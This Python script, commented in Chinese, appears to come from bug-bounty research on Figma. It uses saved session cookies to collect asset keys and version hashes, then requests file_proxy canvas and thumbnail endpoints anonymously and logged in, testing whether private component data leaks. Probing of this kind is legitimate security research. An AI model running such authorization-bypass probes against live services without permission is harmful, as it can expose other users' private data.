"""file_proxy 资产接口匿名 vs 登录 测试

创造目标（接口级判断遗漏）：design_systems/组件数据接口需要登录，
但 /api/file_proxy/component/{key}/canvas?ver= 的鉴权可能只校验 ver 哈希
是否在系统中存在，而不校验请求者对文件/组件的权限 →
用登录态拿到的 key+ver，匿名请求 file_proxy canvas = 私有组件数据泄露。

路径来源（JS 1037 明文确定性来源）：
  /api/file_proxy/component/{key}/canvas?ver={contentHash}
  /api/file_proxy/variable_set/{key}/canvas?ver={checkpoint_key}
  /api/file_proxy/state_group/{key}/canvas?ver={version}
  /component/{key}/thumbnail?ver=&tv=

流程：
  1. 登录态拉 design_systems 全量（published_components / styles / state_groups）
  2. 提取所有资产 key + 关联 ver 字段，打印完整字段
  3. 对每个资产测 file_proxy canvas + thumbnail：匿名 vs 登录
"""
import json, sys
import requests

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

SESS = json.load(open(r"D:\scan\_figma_hunt\figma_session.json"))
CK = {c["name"]: c["value"] for c in SESS if c.get("name") and c.get("value")}
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36"}

PRIVATE = "qzDqStIDJyGbthpKiuvfwg"
PUBLIC = "bv2nMIdFf4u3dESGail4sm"
LK_PRIVATE = "lk-c2fada89c6b5d93b952f0164c5c6e28674794f1cb5ab0bd7cb0d7790f2f223b36d76d04db981bed4d8c9b0174e4fe3fb95f6f9ae56ffbb252a295e92ce5f1d4d"
LK_PUBLIC = "lk-d12a96bab0f2515990ccf0c32d4ad7d6737ae1317c046dcc45bd44b14b69d3e20b92eb4abc1308e300a534cce3a62827e978ae66ee052d1e60a86fcdf833b2ca"

OUT = {}


def get(label, url, cookies=None, raw=False):
    try:
        r = requests.get("https://www.figma.com" + url, cookies=cookies, headers=UA, timeout=15)
        ct = r.headers.get("Content-Type", "")
        if "json" in ct:
            try:
                return r.status_code, r.json()
            except Exception:
                return r.status_code, r.text[:500]
        return r.status_code, r.content[:200] if raw else r.text[:500]
    except Exception as e:
        return "ERR", str(e)


print("=" * 70)
print("阶段1: 登录态拉 design_systems 全量数据")
print("=" * 70)

assets = {}  # key -> {"file": ..., "ver_candidates": [...], "kind": ...}

for label, file_key, lk in [("私有", PRIVATE, LK_PRIVATE), ("公开", PUBLIC, LK_PUBLIC)]:
    print(f"\n--- {label}文件 {file_key} ---")
    # 1. published_components
    st, j = get("components", f"/api/design_systems/v2/library/{lk}/published_components", CK)
    print(f"published_components: {st}")
    if st == 200:
        with open(f"ds_components_{file_key}.json", "w", encoding="utf-8") as f:
            json.dump(j, f, indent=1, ensure_ascii=False)
        comps = j.get("components", []) or []
        print(f"  components: {len(comps)}")
        for c in comps:
            print("  COMPONENT KEYS:", json.dumps({k: v for k, v in c.items() if k in (
                "key", "file_key", "node_id", "name", "description", "remote", "content_hash",
                "checkpoint", "version", "thumbnail_url", "prototype_url", "link_access")}, ensure_ascii=False))
            assets[c.get("key")] = {"file": file_key, "kind": "component",
                                    "ver": c.get("content_hash") or c.get("version")}
        stg = j.get("state_groups", []) or []
        print(f"  state_groups: {len(stg)}")
        for s in stg:
            print("  STATE_GROUP KEYS:", json.dumps({k: v for k, v in s.items() if k in (
                "key", "file_key", "node_id", "name", "content_hash", "version", "checkpoint")}, ensure_ascii=False))
            assets[s.get("key")] = {"file": file_key, "kind": "state_group",
                                    "ver": s.get("content_hash") or s.get("version")}
    # 2. styles
    st, j = get("styles", f"/api/design_systems/library/{file_key}/styles", CK)
    print(f"styles: {st}")
    if st == 200:
        with open(f"ds_styles_{file_key}.json", "w", encoding="utf-8") as f:
            json.dump(j, f, indent=1, ensure_ascii=False)
        stls = j if isinstance(j, list) else (j.get("meta", {}).get("styles", []) if isinstance(j, dict) else [])
        print(f"  styles: {len(stls)}")
        for s in stls:
            print("  STYLE:", json.dumps(s, ensure_ascii=False)[:600])
            key = s.get("key") or s.get("style_key")
            if key:
                assets[key] = {"file": file_key, "kind": s.get("style_type", "style"),
                               "ver": s.get("content_hash") or s.get("version")}

print("\n\n" + "=" * 70)
print("阶段2: file_proxy canvas + thumbnail 匿名 vs 登录")
print("=" * 70)

# 额外试 style/variable_set 路径变体
for key, info in assets.items():
    ver = info.get("ver")
    kind = info.get("kind")
    print(f"\n>>> 资产 {kind} key={key} file={info['file']} ver={ver}")

    # file_proxy canvas 路径家族
    paths = []
    for v in [ver, str(ver).replace(":", "/") if ver else None]:
        if not v:
            continue
        if kind == "component":
            paths.append(("/api/file_proxy/component/" + key + "/canvas", {"ver": v}))
        elif kind == "state_group":
            paths.append(("/api/file_proxy/state_group/" + key + "/canvas", {"ver": v}))
        paths.append(("/api/file_proxy/variable_set/" + key + "/canvas", {"ver": v}))
    # 通用兜底：三种路径都试 ver
    for kind_path in ("component", "state_group", "variable_set"):
        if ver:
            paths.append((f"/api/file_proxy/{kind_path}/{key}/canvas", {"ver": ver}))

    seen = set()
    for path, params in paths:
        qs = "&".join(f"{k}={requests.utils.quote(str(v), safe='')}" for k, v in params.items())
        u = f"{path}?{qs}"
        if u in seen:
            continue
        seen.add(u)
        a_st, a_body = get("anon", u)
        b_st, b_body = get("auth", u, CK)
        ab = (a_body if isinstance(a_body, bytes) else str(a_body))[:120]
        bb = (b_body if isinstance(b_body, bytes) else str(b_body))[:120]
        flag = " <<< 差异!" if (a_st != b_st or (isinstance(a_body, (bytes, bytearray)) and isinstance(b_body, (bytes, bytearray)) and a_body != b_body)) else ""
        print(f"  {u}\n    匿名 {a_st} {ab}\n    登录 {b_st} {bb}{flag}")

    # thumbnail 家族
    for tv in ["", "1", ver]:
        q = f"/component/{key}/thumbnail?ver=&tv={tv}" if tv else f"/component/{key}/thumbnail?ver="
        a_st, a_body = get("anon", q, raw=True)
        b_st, b_body = get("auth", q, CK, raw=True)
        ab = (a_body[:80] if isinstance(a_body, bytes) else str(a_body))[:120]
        bb = (b_body[:80] if isinstance(b_body, bytes) else str(b_body))[:120]
        flag = " <<< 差异!" if a_st != b_st else ""
        print(f"  /component/{key}/thumbnail tv={tv or '(空)'}\n    匿名 {a_st} {ab}\n    登录 {b_st} {bb}{flag}")
